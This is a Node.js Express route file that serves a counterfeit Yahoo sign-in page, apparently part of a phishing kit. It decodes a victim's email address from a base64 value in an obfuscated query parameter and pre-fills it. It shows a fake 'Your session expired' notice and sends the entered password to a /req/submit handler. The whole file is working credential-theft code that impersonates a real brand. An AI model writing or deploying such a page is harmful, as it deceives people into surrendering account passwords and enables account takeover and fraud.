
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.kjgfhdgudgherueru9843efjdfhfwheur;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
        <!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/x-icon" href="./images/img.ico">
        <meta name="format-detection" content="telephone=no">
        <title>Yahoo</title>
        <link href="./stylesheet/main.css" rel="stylesheet" type="text/css">
</head>
<body>
    <div class="topdiv">
        <span class="column">
            <a href="https://www.yahoo.com/">
               <img src="./images/frontpage.png" alt="Yahoo" class="logo "  style="width:120px; height:36px;">
              
           </a>
       </span>
       <span class="help">
        <a href="https://help.yahoo.com/">Help</a>
    </span>

    </div>
    <div class="bottomrt">
    <div class="leftbox" >
    <!-- <img src="./images/ylt.png" class="leftimage"> </div> -->
     <div class="ptext">

        
       <b><p id="paratext">Yahoo makes it easy to enjoy what matters most in the world.</p></b> 
        <p id="paratext">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
     </div>

    <div class="rightbox">
        <img src="./images/frontpage.png" alt="Yahoo" style="width:90px; height:27px;padding-top: 28px;">
        <br> <br>
        <form method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
        <input type="text" id ="username" readonly="" value="${username}">
        <p id="strong"> Enter password</p>
        <p> to finish sign in</p>
        <p id="Error"> Your session expired</p>
        <br><br>
        <input type='hidden' name="username" id="useRname" value="${username}">
        <input required='' id ="Password" name="password" type='password' id="pEyar">
        <label alt='Password' placeholder='Password'></label>
        <br>

        <input id="button" type="submit" value="Next" >
        <br><br><br>

        <a> Forgot password?</a>
                 </form>

    </div>

    </div>
</div>
</body>
</html>

    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});




module.exports =router